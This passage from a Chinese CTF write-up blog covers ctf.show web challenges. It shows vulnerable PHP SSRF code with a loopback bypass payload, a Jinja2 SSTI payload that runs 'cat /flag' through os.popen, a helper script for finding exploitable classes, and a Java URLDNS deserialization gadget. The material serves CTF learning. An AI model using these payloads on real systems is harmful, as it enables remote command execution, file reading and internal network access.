<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="nv">$url</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nv">$x</span><span class="o">=</span><span class="nx">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$x</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">]</span><span class="o">===</span><span class="s1">&#39;http&#39;</span><span class="o">||</span><span class="nv">$x</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">]</span><span class="o">===</span><span class="s1">&#39;https&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="nv">$host</span><span class="o">=</span><span class="nv">$x</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="k">if</span><span class="p">((</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$host</span><span class="p">)</span><span class="o">&lt;=</span><span class="mi">3</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="nv">$ch</span><span class="o">=</span><span class="nx">curl_init</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_HEADER</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">echo</span> <span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>payload:</p>
<pre tabindex="0"><code>url=http://0/flag.php
</code></pre><h4 id="web357">web357<a hidden class="anchor" aria-hidden="true" href="#web357">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="nv">$url</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nv">$x</span><span class="o">=</span><span class="nx">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$x</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">]</span><span class="o">===</span><span class="s1">&#39;http&#39;</span><span class="o">||</span><span class="nv">$x</span><span class="p">[</span><span class="s1">&#39;scheme&#39;</span><span class="p">]</span><span class="o">===</span><span class="s1">&#39;https&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="nv">$ip</span> <span class="o">=</span> <span class="nx">gethostbyname</span><span class="p">(</span><span class="nv">$x</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="k">echo</span> <span class="s1">&#39;&lt;/br&gt;&#39;</span><span class="o">.</span><span class="nv">$ip</span><span class="o">.</span><span class="s1">&#39;&lt;/br&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">filter_var</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nx">FILTER_VALIDATE_IP</span><span class="p">,</span> <span class="nx">FILTER_FLAG_NO_PRIV_RANGE</span> <span class="o">|</span> <span class="nx">FILTER_FLAG_NO_RES_RANGE</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;ip!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;scheme&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><h3 id="ssti">ssti<a hidden class="anchor" aria-hidden="true" href="#ssti">#</a></h3>
<p>通过遍历找模块</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">from</span> <span class="nn">jinja2</span> <span class="kn">import</span> <span class="n">Template</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="n">search</span> <span class="o">=</span> <span class="s1">&#39;os&#39;</span>   <span class="c1">#你想利用的模块</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="n">num</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="n">num</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">            <span class="k">if</span> <span class="n">search</span> <span class="ow">in</span> <span class="n">i</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">keys</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">num</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">            <span class="c1"># print(&#34;no&#34;)</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">            <span class="k">pass</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">
</span></span><span class="line"><span class="ln">20</span><span class="cl">
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
</span></span></code></pre></div><h4 id="web361">web361<a hidden class="anchor" aria-hidden="true" href="#web361">#</a></h4>
<p>没有waf，直接打</p>
<pre tabindex="0"><code>{{g.pop.__globals__.__builtins__[&#39;__import__&#39;](&#39;os&#39;).popen(&#39;cat /flag&#39;).read()}}
</code></pre><h4 id="web362">web362<a hidden class="anchor" aria-hidden="true" href="#web362">#</a></h4>
<pre tabindex="0"><code></code></pre><h3 id="java反序列化"><strong>Java反序列化：</strong><a hidden class="anchor" aria-hidden="true" href="#java反序列化">#</a></h3>
<h4 id="web846">web846<a hidden class="anchor" aria-hidden="true" href="#web846">#</a></h4>
<p>URLDNS</p>
<p>payload：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.</span><span class="w"> </span><span class="o">*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.net.URL</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">URLDNS</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">serialize</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="w">        </span><span class="n">ByteArrayOutputStream</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayOutputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="w">        </span><span class="n">ObjectOutput</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">data</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">flush</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">Base64</span><span class="p">.</span><span class="na">getEncoder</span><span class="p">().</span><span class="na">encodeToString</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="na">toByteArray</span><span class="p">()));</span><span class="w">
</span></span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="w">    </span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="w">        </span><span class="n">HashMap</span><span class="o">&lt;</span><span class="n">URL</span><span class="p">,</span><span class="n">Integer</span><span class="o">&gt;</span><span class="w"> </span><span class="n">hashmap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;</span><span class="n">URL</span><span class="p">,</span><span class="n">Integer</span><span class="o">&gt;</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="w">        </span><span class="n">URL</span><span class="w"> </span><span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">URL</span><span class="p">(</span><span class="s">&#34;https://78c78067-c876-40fb-b175-edb3b743655d.challenge.ctf.show/&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">url</span><span class="p">.</span><span class="na">getClass</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">hashcodefield</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">c</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;hashCode&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="w">        </span><span class="n">hashcodefield</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="w"></span><span class="c1">//          不想这里发起请求，把url对象的hashcode改成不是-1</span><span class="w">
</span></span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="w">        </span><span class="n">hashcodefield</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">911</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="w">        </span><span class="n">hashmap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="w">        </span><span class="n">hashcodefield</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="o">-</span><span class="n">1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="w"></span><span class="c1">//          这里把hashcode改回-1</span><span class="w">
</span></span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="w">        </span><span class="n">serialize</span><span class="p">(</span><span class="n">hashmap</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>

  </footer><div id="tw-comment"></div>
<script>
    
    const getStoredTheme = () => localStorage.getItem("pref-theme") === "light" ? "light" : "dark";
    const setGiscusTheme = () => {
        const sendMessage = (message) => {
            const iframe = document.querySelector('iframe.giscus-frame');
            if (iframe) {
                iframe.contentWindow.postMessage({giscus: message}, 'https://giscus.app');
            }
        }
        sendMessage({setConfig: {theme: getStoredTheme()}})
    }

    document.addEventListener("DOMContentLoaded", () => {
        const giscusAttributes = {
            "src": "https://giscus.app/client.js",
            "data-repo": "sonnycalcr\/sonnycalcr.github.io",
            "data-repo-id": "xxxxxx",
            "data-category": "Announcements",
            "data-category-id": "xxxxx",
            "data-mapping": "pathname",
            "data-strict": "0",
            "data-reactions-enabled": "1",
            "data-emit-metadata": "0",
            "data-input-position": "bottom",
            "data-theme": getStoredTheme(),
            "data-lang": "zh-CN",
            "data-loading": "lazy",
            "crossorigin": "anonymous",
        };

        
        const giscusScript = document.createElement("script");
        Object.entries(giscusAttributes).forEach(
                ([key, value]) => giscusScript.setAttribute(key, value));
        document.querySelector("#tw-comment").appendChild(giscusScript);

        
        const themeSwitcher = document.querySelector("#theme-toggle");
        if (themeSwitcher) {
            themeSwitcher.addEventListener("click", setGiscusTheme);
        }
        const themeFloatSwitcher = document.querySelector("#theme-toggle-float");
        if (themeFloatSwitcher) {
            themeFloatSwitcher.addEventListener("click", setGiscusTheme);
        }
    });
</script>
</article>
    </main>
    
<footer class="footer">
        <span><a href="https://blog.xrntkk.top/">©2024 Xrntkk&rsquo;s Blog</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = '复制';

        function copyingDone() {
            copybutton.innerHTML = '已复制！';
            setTimeout(() => {
                copybutton.innerHTML = '复制';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
